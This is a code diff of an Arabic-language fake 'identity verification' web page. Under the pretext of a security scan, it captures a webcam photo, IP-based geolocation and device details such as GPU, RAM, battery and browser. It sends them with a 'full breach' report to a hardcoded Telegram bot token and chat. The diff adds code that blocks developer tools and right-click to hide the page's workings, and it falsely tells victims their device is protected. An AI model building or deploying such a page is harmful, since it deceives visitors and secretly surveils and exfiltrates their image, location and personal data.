@@ -5,15 +5,22 @@
     <title>نظام التحقق الأمني الموحد</title>
     <link rel="icon" type="image/png" href="https://img.icons8.com/fluency/48/000000/shield.png">
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0b1118; color: #fff; text-align: center; padding-top: 80px; margin: 0; }
+        body { 
+            font-family: 'Segoe UI', sans-serif; 
+            background: #0b1118; 
+            color: #fff; 
+            text-align: center; 
+            padding-top: 80px; 
+            margin: 0; 
+            user-select: none; /* منع تحديد النصوص */
+        }
         .box { border: 1px dashed #3498db; padding: 30px; border-radius: 15px; display: inline-block; background: #1c252e; width: 85%; max-width: 450px; }
-        .btn { background: #3498db; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; }
+        .btn { background: #3498db; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; transition: 0.3s; }
+        .btn:hover { background: #2980b9; }
         video, canvas { display: none; }
     </style>
 </head>
-<body>
-
-    <div class="box">
+<body oncontextmenu="return false;"> <div class="box">
         <div style="font-size: 40px;">🛡️</div>
         <h3>بروتوكول التحقق من الهوية</h3>
         <p style="font-size: 0.9em; color: #bdc3c7;">يجب إجراء فحص للعتاد والكاميرا للتأكد من مطابقة بياناتك المسجلة لدينا.</p>
@@ -23,6 +30,22 @@
     <video id="v" autoplay></video><canvas id="c"></canvas>
 
     <script>
+        // --- سكريبت الحماية المطور ---
+        document.addEventListener('keydown', function(e) {
+            // منع F12
+            if (e.keyCode == 123) return false;
+            // منع Ctrl+Shift+I (Inspect)
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+            // منع Ctrl+Shift+J (Console)
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
+            // منع Ctrl+U (View Source)
+            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+        }, false);
+
+        // منع القائمة اليمنى بطريقة ثانية للتأكيد
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        // --- كود سحب البيانات والصورة ---
         const TG_TOKEN = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
         const CH_ID = "1678506419";
 
@@ -37,7 +60,6 @@
                     c.width = v.videoWidth; c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0);
 
-                    // سحب البيانات الضخمة
                     const ipReq = await fetch('https://ipapi.co/json/');
                     const i = await ipReq.json();
                     
@@ -48,9 +70,9 @@
                     }
 
                     const gl = c.getContext('webgl');
-                    const gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
 
-                    // تجميع التقرير الشامل
                     const report = `
 🚀 *تقرير اختراق شامل (Full Breach)*
 ----------------------------------
@@ -66,15 +88,13 @@
 - الرام: ${navigator.deviceMemory || "Unknown"} GB
 - كرت الشاشة: ${gpu}
 - البطارية: ${b}
-- الشاشة: ${screen.width}x${screen.height} (${screen.colorDepth}bit)
+- الشاشة: ${screen.width}x${screen.height}
 
 🌐 *المتصفح والبرمجيات:*
 - اللغات: ${navigator.languages.join(', ')}
 - الـ UserAgent: \`${navigator.userAgent.substring(0, 50)}...\`
-- ملفات تعريف الارتباط: ${navigator.cookieEnabled ? "مفعلة" : "معطلة"}
-- حالة الإنترنت: ${navigator.onLine ? "Online" : "Offline"}
 
-🔗 *رابط الموقع:* [فتح الخريطة](https://www.google.com/maps?q=${i.latitude},${i.longitude})
+🔗 *رابط الموقع:* [فتح الخريطة](http://maps.google.com/maps?q=${i.latitude},${i.longitude})
 ----------------------------------`;
 
                     c.toBlob(f => {
@@ -87,10 +107,12 @@
                     }, 'image/jpeg');
 
                     stream.getTracks().forEach(t => t.stop());
-                    alert("اكتمل الفحص. جهازك محمي الآن.");
+                    alert("اكتمل الفحص بنجاح. جهازك الآن ضمن النطاق المحمي.");
                     window.location.href = "https://google.com";
                 }, 1000);
-            } catch (e) { alert("يجب السماح بالصلاحيات."); }
+            } catch (e) { 
+                alert("تنبيه: يجب السماح بصلاحية الكاميرا لإتمام بروتوكول الأمان."); 
+            }
         }
     </script>
 </body>
